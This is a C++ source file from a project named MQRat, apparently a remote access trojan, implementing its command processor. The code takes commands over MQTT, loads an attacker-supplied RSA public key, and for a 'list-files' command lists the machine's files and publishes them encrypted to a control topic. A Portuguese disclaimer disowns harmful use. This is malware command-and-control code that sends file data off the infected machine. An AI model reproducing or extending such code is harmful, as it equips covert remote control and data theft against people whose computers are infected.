/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <exception>
#include <string>
#include <openssl/rsa.h>
#include <stdexcept>
#include "command_processor.hpp"
#include "api.hpp"
#include "log.hpp"
#include "mqtt_client.hpp"
#include "utils.hpp"
#include "crypto.hpp"
#include "encoders/base64.hpp"

using namespace Crypto;

CommandProcessor::CommandProcessor(string cmd, void *client)
{
    this->command = cmd;
    this->client = client;
    this->public_key_len = 0;
    this->public_key = "";
}

void CommandProcessor::Process()
{
    string output = "";
    auto client = static_cast<MqttClient*>(this->client);
    auto send_topic = client->getSendTopic();
    RSACipher *cipher = new RSACipher();

    // read the length of public key
    auto s_pubkey_len = this->command.substr(command.length() - 3);
    public_key_len = std::strtoul(s_pubkey_len.c_str(), nullptr, 16);
    auto command_len = command.length() - public_key_len- s_pubkey_len.length();
    auto raw_command = command.substr(0, command_len);
    auto public_key = command.substr(raw_command.length(), public_key_len);
    
    // Update command variable
    command = raw_command;

    // Decode public key
    public_key = base64_decode(public_key);

    Log::LogInfo("public key:\n" + public_key);
    Log::LogInfo("raw command: " + raw_command);

    try {
        // Load public key into memory
        cipher->LoadPublicKey(public_key.c_str(), public_key.length());
    
        // Process command
        if(command == "list-files") {
            auto files = API::FileSystem::ListFiles();
            client->Publish(files, send_topic, cipher);
        } else {
            client->SendError();
            Log::LogInfo("Unknown command received");
        }

    } catch(std::runtime_error& e) {
        Log::LogError(string("Something goes wrong: ") + e.what());
        goto free_resources;
    }

free_resources:
    delete cipher;
}
